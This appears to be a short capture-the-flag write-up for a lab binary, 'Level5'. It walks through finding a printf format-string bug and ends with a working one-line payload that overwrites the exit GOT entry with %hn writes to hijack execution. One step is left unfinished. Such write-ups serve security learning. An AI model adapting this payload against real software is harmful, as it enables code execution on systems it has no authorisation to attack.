## Level5
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
- #### analyse the instructions searsh about call functions or operations.
    ```c
    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE
    08049814 R_386_GLOB_DAT    __gmon_start__
    08049848 R_386_COPY        stdin
    08049824 R_386_JUMP_SLOT   printf
    08049828 R_386_JUMP_SLOT   _exit
    0804982c R_386_JUMP_SLOT   fgets
    08049830 R_386_JUMP_SLOT   system
    08049834 R_386_JUMP_SLOT   __gmon_start__
    08049838 R_386_JUMP_SLOT   exit
    0804983c R_386_JUMP_SLOT   __libc_start_main
    ```
- #### try to get the source code,
- #### detect the vulnrability type, which is printf format string `printf(buffer)`
- #### use .
- #### solution command 
    ```sh
         (python -c 'print("\x3a\x98\x04\x08"+"\x38\x98\x04\x08"+"%2044x"+"%4$hn"+"%31904x"+"%5$hn")'; cat) | ./level5  
    ```


